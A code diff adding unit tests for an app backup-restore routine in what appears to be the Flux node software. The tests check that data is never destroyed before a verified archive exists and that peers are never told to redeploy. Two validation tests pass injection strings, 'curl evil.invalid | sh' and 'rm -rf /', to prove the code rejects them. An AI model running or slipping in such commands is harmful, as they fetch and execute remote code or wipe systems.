@@ -2837,6 +2837,405 @@ describe('advancedWorkflows tests', () => {
     });
   });
 
+  describe('appendRestoreTask tests', () => {
+    // The restore deleted appdata before it had an archive to put back, and then
+    // told every other instance to hard redeploy - which rm -rf'd their volumes.
+    // A 373-byte archive taken from an instance that had never synced was enough
+    // to destroy a 35 GB world on the one node that did hold it. So: nothing is
+    // destroyed until a complete archive is known to exist, and no peer is ever
+    // asked to delete anything.
+    // eslint-disable-next-line global-require
+    const verificationHelper = require('../../ZelBack/src/services/verificationHelper');
+    // eslint-disable-next-line global-require
+    const registryManager = require('../../ZelBack/src/services/appDatabase/registryManager');
+    // eslint-disable-next-line global-require
+    const syncthingService = require('../../ZelBack/src/services/syncthingService');
+    // eslint-disable-next-line global-require
+    const dockerService = require('../../ZelBack/src/services/dockerService');
+    // eslint-disable-next-line global-require
+    const IOUtils = require('../../ZelBack/src/services/IOUtils');
+    // eslint-disable-next-line global-require
+    const globalState = require('../../ZelBack/src/services/utils/globalState');
+    // eslint-disable-next-line global-require
+    const serviceHelper = require('../../ZelBack/src/services/serviceHelper');
+    // eslint-disable-next-line global-require
+    const fluxNetworkHelper = require('../../ZelBack/src/services/fluxNetworkHelper');
+    // eslint-disable-next-line global-require
+    const appController = require('../../ZelBack/src/services/appManagement/appController');
+    // eslint-disable-next-line global-require
+    const appReconciler = require('../../ZelBack/src/services/appMonitoring/appReconciler');
+    // eslint-disable-next-line global-require
+    const { appsFolder } = require('../../ZelBack/src/services/utils/appConstants');
+
+    const appname = 'palworld1785719281005';
+    const folderId = `fluxpalworld_${appname}`;
+    const mount = `/mnt/appdata/flux-apps/${folderId}`;
+    const localAddr = '1.2.3.4:16127';
+
+    function specWith(containerData) {
+      return {
+        version: 8,
+        name: appname,
+        compose: [{ name: 'palworld', containerData }],
+      };
+    }
+
+    function makeRes() {
+      return {
+        write: sinon.stub(), flush: sinon.stub(), end: sinon.stub(), json: sinon.stub(),
+      };
+    }
+
+    // The UI sends EVERY component of the app on every request, the unselected
+    // ones flagged false and carrying an empty url.
+    function restoreReq(overrides = {}) {
+      return {
+        body: {
+          appname,
+          type: 'remote',
+          restore: [
+            { component: 'palworld', restore: true, url: 'https://example.invalid/backup_palworld.tar.gz' },
+            { component: 'sidecar', restore: false, url: '' },
+          ],
+          ...overrides,
+        },
+        headers: { zelidauth: 'auth' },
+      };
+    }
+
+    function fdmNames(ip) {
+      serviceHelper.axiosGet.resolves({ data: { status: 'success', data: { ips: [ip] } } });
+    }
+
+    beforeEach(() => {
+      // getter-only on globalState, so it is emptied in place - assigning a new
+      // array silently does nothing and leaks the lease into the next test
+      globalState.restoreInProgress.length = 0;
+      globalState.receiveOnlySyncthingAppsCache.clear();
+      sinon.stub(serviceHelper, 'delay').resolves();
+      sinon.stub(serviceHelper, 'axiosGet').resolves({ data: { status: 'success', data: { ips: [localAddr] } } });
+      sinon.stub(verificationHelper, 'verifyPrivilege').resolves(true);
+      sinon.stub(registryManager, 'getApplicationGlobalSpecifications').resolves(specWith('g:/palworld/Pal/Saved|m:mods:/mods'));
+      sinon.stub(registryManager, 'getApplicationSpecifications').resolves(specWith('g:/palworld/Pal/Saved|m:mods:/mods'));
+      sinon.stub(syncthingService, 'adjustConfigFolders').resolves({ status: 'success' });
+      sinon.stub(syncthingService, 'getConfigFolders').resolves({
+        status: 'success',
+        data: [{ id: folderId, path: `${appsFolder}${folderId}`, type: 'sendreceive' }],
+      });
+      sinon.stub(dockerService, 'appDockerStop').resolves();
+      sinon.stub(dockerService, 'appDockerStart').resolves();
+      sinon.stub(fluxNetworkHelper, 'getLocalSocketAddress').resolves(localAddr);
+      sinon.stub(appController, 'executeAppGlobalCommand').resolves();
+      sinon.stub(appReconciler, 'setControllerDesired');
+      sinon.stub(IOUtils, 'getVolumeInfo').resolves([{ mount, available: 100 * 1024 * 1024 * 1024 }]);
+      sinon.stub(IOUtils, 'removeDirectory').resolves(true);
+      sinon.stub(IOUtils, 'downloadFileFromUrl').resolves(true);
+      sinon.stub(IOUtils, 'getRemoteFileSize').resolves(4096);
+      sinon.stub(IOUtils, 'getFileSize').resolves(4096);
+      sinon.stub(IOUtils, 'inspectTarGz').resolves({ status: true, entries: 1200, bytes: 900 * 1024 * 1024 });
+      sinon.stub(IOUtils, 'getDirectorySizeBytes').resolves(800 * 1024 * 1024);
+      sinon.stub(IOUtils, 'untarFile').resolves({ status: true });
+      sinon.stub(IOUtils, 'removeFile').resolves(true);
+      sinon.stub(log, 'info');
+      sinon.stub(log, 'warn');
+      sinon.stub(log, 'error');
+    });
+
+    describe('input validation', () => {
+      it('refuses a type that is not one of the three backup directories', async () => {
+        // type names a directory inside the volume and reaches a shell through
+        // tar, so an unrecognised one must be refused, never interpolated
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq({ type: 'remote; curl evil.invalid | sh #' }), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.notCalled(IOUtils.untarFile);
+        sinon.assert.notCalled(IOUtils.removeDirectory);
+        sinon.assert.notCalled(dockerService.appDockerStop);
+      });
+
+      it('refuses a component the app does not have', async () => {
+        const req = restoreReq();
+        req.body.restore = [{ component: 'palworld; rm -rf /', restore: true, url: 'https://example.invalid/a.tar.gz' }];
+
+        const result = await advancedWorkflows.appendRestoreTask(req, makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.notCalled(IOUtils.untarFile);
+        sinon.assert.notCalled(IOUtils.removeDirectory);
+      });
+
+      it('restores only the components asked for, not every one the UI listed', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves({
+          version: 8,
+          name: appname,
+          compose: [
+            { name: 'palworld', containerData: 'g:/palworld/Pal/Saved' },
+            { name: 'sidecar', containerData: '/data' },
+          ],
+        });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledOnce(IOUtils.untarFile);
+        sinon.assert.calledWith(IOUtils.untarFile, `${mount}/appdata`);
+      });
+    });
+
+    describe('acquire before destroy', () => {
+      it('does not touch appdata when the archive is unreadable', async () => {
+        IOUtils.inspectTarGz.resolves({ status: false, error: 'gzip: unexpected end of file' });
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
+        sinon.assert.notCalled(IOUtils.untarFile);
+      });
+
+      it('does not touch appdata when the archive holds nothing', async () => {
+        IOUtils.inspectTarGz.resolves({ status: true, entries: 0, bytes: 0 });
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
+      });
+
+      it('does not touch appdata when the download arrived short', async () => {
+        IOUtils.getRemoteFileSize.resolves(18 * 1024 * 1024);
+        IOUtils.getFileSize.resolves(4 * 1024 * 1024);
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
+        sinon.assert.notCalled(IOUtils.untarFile);
+      });
+
+      it('reads the archive before it clears appdata, not after', async () => {
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.callOrder(
+          IOUtils.inspectTarGz,
+          IOUtils.removeDirectory.withArgs(`${mount}/appdata`, true),
+          IOUtils.untarFile,
+        );
+      });
+
+      it('refuses when the archive cannot fit in the room clearing appdata frees', async () => {
+        IOUtils.getVolumeInfo.resolves([{ mount, available: 2 * 1024 * 1024 * 1024 }]);
+        IOUtils.getDirectorySizeBytes.resolves(1 * 1024 * 1024 * 1024);
+        IOUtils.inspectTarGz.resolves({ status: true, entries: 10, bytes: 30 * 1024 * 1024 * 1024 });
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.neverCalledWith(IOUtils.removeDirectory, `${mount}/appdata`);
+      });
+
+      it('refuses when the volume is not mounted rather than failing on undefined', async () => {
+        // df only reports mounted filesystems, so this is the shape an unmounted
+        // volume takes. Asserting the message matters: reading [0].mount off it
+        // also ends the restore, but as a TypeError with nothing said about why
+        const res = makeRes();
+        IOUtils.getVolumeInfo.resolves(null);
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), res);
+
+        expect(result).to.equal(false);
+        sinon.assert.notCalled(IOUtils.untarFile);
+        sinon.assert.calledWithMatch(res.write, /volume is not mounted/);
+      });
+    });
+
+    describe('the other instances', () => {
+      it('never asks a peer to redeploy', async () => {
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.neverCalledWith(appController.executeAppGlobalCommand, appname, 'redeploy');
+      });
+
+      it('leaves a g: app alone - the other instances are stopped and syncthing carries it', async () => {
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.notCalled(appController.executeAppGlobalCommand);
+      });
+
+      it('restarts the peers of an s: component, whose containers are all running', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves(specWith('s:/data'));
+        registryManager.getApplicationSpecifications.resolves(specWith('s:/data'));
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledWithExactly(appController.executeAppGlobalCommand, appname, 'apprestart', 'auth', undefined, true);
+      });
+
+      it('leaves an unsynced app alone entirely - no peer holds its data', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves(specWith('/data'));
+        registryManager.getApplicationSpecifications.resolves(specWith('/data'));
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.notCalled(appController.executeAppGlobalCommand);
+        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'patch', { paused: true }, folderId);
+      });
+
+      it('does not fan out when the restore failed', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves(specWith('s:/data'));
+        registryManager.getApplicationSpecifications.resolves(specWith('s:/data'));
+        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.notCalled(appController.executeAppGlobalCommand);
+      });
+    });
+
+    describe('the syncthing folder', () => {
+      it('pauses the folder per component and never deletes it', async () => {
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: true }, folderId);
+        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
+        sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'delete');
+      });
+
+      it('resumes the folder when the restore fails', async () => {
+        IOUtils.inspectTarGz.resolves({ status: false, error: 'gzip: unexpected end of file' });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
+        expect(globalState.restoreInProgress).to.not.include(appname);
+      });
+
+      it('marks the restored copy settled so the peers take it', async () => {
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(globalState.receiveOnlySyncthingAppsCache.get(folderId)).to.include({ restarted: true });
+      });
+
+      it('holds a half-written copy out of sync instead of broadcasting it', async () => {
+        // the unpack failed with appdata already cleared, so what is on disk is
+        // neither copy. Demoted, held, and marked NOT settled - a settled entry
+        // sends the folder state machine down the path that starts the
+        // container on exactly this partial data
+        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.calledWith(syncthingService.adjustConfigFolders, 'patch', { type: 'receiveonly' });
+        expect(globalState.receiveOnlySyncthingAppsCache.get(folderId)).to.include({ restarted: false });
+        sinon.assert.calledWith(appReconciler.setControllerDesired, folderId, 'stopped');
+      });
+
+      it('leaves a component that restored cleanly alone when a later one fails', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves({
+          version: 8,
+          name: appname,
+          compose: [
+            { name: 'palworld', containerData: 'g:/palworld/Pal/Saved' },
+            { name: 'mods', containerData: 'g:/mods' },
+          ],
+        });
+        const req = restoreReq();
+        req.body.restore = [
+          { component: 'palworld', restore: true, url: 'https://example.invalid/a.tar.gz' },
+          { component: 'mods', restore: true, url: 'https://example.invalid/b.tar.gz' },
+        ];
+        IOUtils.untarFile.onFirstCall().resolves({ status: true });
+        IOUtils.untarFile.onSecondCall().resolves({ status: false, error: 'no space left on device' });
+
+        await advancedWorkflows.appendRestoreTask(req, makeRes());
+
+        // only the one that was mid-replacement is demoted
+        sinon.assert.neverCalledWith(appReconciler.setControllerDesired, folderId, 'stopped');
+        sinon.assert.calledWith(appReconciler.setControllerDesired, `fluxmods_${appname}`, 'stopped');
+      });
+    });
+
+    describe('the archive', () => {
+      it('removes the copy it downloaded only once the app is back up', async () => {
+        // deleting it the moment the unpack returned - before the app had been
+        // started - threw away the one thing a failure could be retried from
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.calledWithExactly(IOUtils.removeFile, `${mount}/backup/remote/backup_palworld.tar.gz`);
+        sinon.assert.callOrder(IOUtils.untarFile, dockerService.appDockerStart, IOUtils.removeFile);
+      });
+
+      it('keeps an uploaded archive - it is the owner\'s copy, not ours', async () => {
+        const req = restoreReq({ type: 'upload' });
+        req.body.restore = [{ component: 'palworld', restore: true }];
+
+        await advancedWorkflows.appendRestoreTask(req, makeRes());
+
+        sinon.assert.notCalled(IOUtils.removeFile);
+      });
+
+      it('keeps the downloaded archive when the restore failed, so it can be retried', async () => {
+        IOUtils.untarFile.resolves({ status: false, error: 'no space left on device' });
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.notCalled(IOUtils.removeFile);
+      });
+    });
+
+    describe('where the restore runs', () => {
+      it('refuses a g: restore on an instance that is not the one FDM points at', async () => {
+        fdmNames('9.9.9.9:16127');
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(false);
+        sinon.assert.notCalled(dockerService.appDockerStop);
+        sinon.assert.notCalled(IOUtils.untarFile);
+      });
+
+      it('proceeds on a different instance when force is given', async () => {
+        fdmNames('9.9.9.9:16127');
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq({ force: true }), makeRes());
+
+        expect(result).to.equal(true);
+        sinon.assert.called(IOUtils.untarFile);
+      });
+
+      it('proceeds when FDM cannot be reached - an unreachable FDM must not block a restore', async () => {
+        serviceHelper.axiosGet.rejects(new Error('ECONNREFUSED'));
+
+        const result = await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        expect(result).to.equal(true);
+        sinon.assert.called(IOUtils.untarFile);
+      });
+
+      it('does not consult FDM for a component with no elected writer', async () => {
+        registryManager.getApplicationGlobalSpecifications.resolves(specWith('s:/data'));
+        registryManager.getApplicationSpecifications.resolves(specWith('s:/data'));
+
+        await advancedWorkflows.appendRestoreTask(restoreReq(), makeRes());
+
+        sinon.assert.notCalled(serviceHelper.axiosGet);
+      });
+    });
+
+    it('restores a legacy app, which addresses its single volume as null', async () => {
+      const legacy = { version: 3, name: appname, containerData: 'g:/data' };
+      registryManager.getApplicationGlobalSpecifications.resolves(legacy);
+      registryManager.getApplicationSpecifications.resolves(legacy);
+      const req = restoreReq();
+      req.body.restore = [{ component: 'null', restore: true, url: 'https://example.invalid/a.tar.gz' }];
+
+      const result = await advancedWorkflows.appendRestoreTask(req, makeRes());
+
+      expect(result).to.equal(true);
+      sinon.assert.calledWith(IOUtils.getVolumeInfo, appname, 'null');
+    });
+  });
+
   // Note: verifyAppUpdateParameters, getPeerAppsInstallingErrorMessages, and
   // stopSyncthingApp are complex integration functions or HTTP request handlers
   // that require extensive mocking of database connections, HTTP requests, and
